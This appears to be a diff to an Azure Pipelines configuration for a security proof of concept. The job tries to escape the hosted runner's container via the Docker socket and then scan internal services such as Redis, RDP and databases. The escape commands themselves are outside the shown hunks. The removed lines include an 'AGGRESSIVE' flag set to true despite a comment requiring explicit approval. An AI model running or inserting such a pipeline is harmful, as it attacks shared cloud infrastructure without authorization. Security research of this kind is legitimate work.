@@ -1,33 +1,21 @@
 # azure-pipelines.yml
-
 trigger:
-  - main
-
+- main
 pr:
-  - main
+- main
 
 name: $(Date:yyyyMMdd)$(Rev:.r)
 
-variables:
-  SAFE_PORTS: "22,80,135,443,3306,3389,5432,6379,8080,8443"
-  IMDS_API: "2021-02-01"
-  ATTEST_API: "2018-10-01"
-  # Flip to 'true' ONLY with explicit Azure approval (enables Redis PING + minimal Docker host-escape proof)
-  AGGRESSIVE: "true"
-
 stages:
-- stage: Recon
-  displayName: Hosted runner recon & provenance
+- stage: ReconAndExploit
+  displayName: 'Reconnaissance & Exploitation PoC'
   jobs:
-
-  # ------------------------- L I N U X -------------------------
-  - job: full_attack_chain_poc
-    displayName: 'Linux Step 3: Full Attack Chain PoC (Host Escape & Targeted Scan)'
-    dependsOn: linux_recon_escape_vector_check # Keep this dependency
+  - job: Linux_Host_Escape_And_Scan_PoC
+    displayName: 'PoC: Host Escape & Targeted Internal Scan'
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
-    - checkout: none
+    - checkout: none # No source code is needed for this PoC.
     - task: Bash@3
       displayName: 'Attempt Container Escape and Hunt for Open Services'
       inputs:
@@ -59,9 +47,9 @@ stages:
             echo "✅ HUNT COMPLETE: Targeted scan from host finished."
             echo "Review the 'host-escape-TARGETED-scan.txt' artifact for any open services."
           else
-            echo "❌ TEST INCONCLUSIVE: The container escape vector was not found."
-            id
-            ls -l /var/run/docker.sock || echo "Socket not found."
+            echo "❌ TEST INCONCLUSIVE: The container escape vector (user in docker group) was not found."
+            id | tee artifacts/poc-failure-id.txt
+            ls -l /var/run/docker.sock | tee -a artifacts/poc-failure-id.txt || echo "Socket not found." | tee -a artifacts/poc-failure-id.txt
             exit 1
           fi
     - task: PublishPipelineArtifact@1
@@ -69,4 +57,4 @@ stages:
       condition: succeededOrFailed()
       inputs:
         targetPath: 'artifacts'
-        artifact: 'azure-poc-linux-step3-host-escape'
+        artifact: 'azure-poc-host-escape'
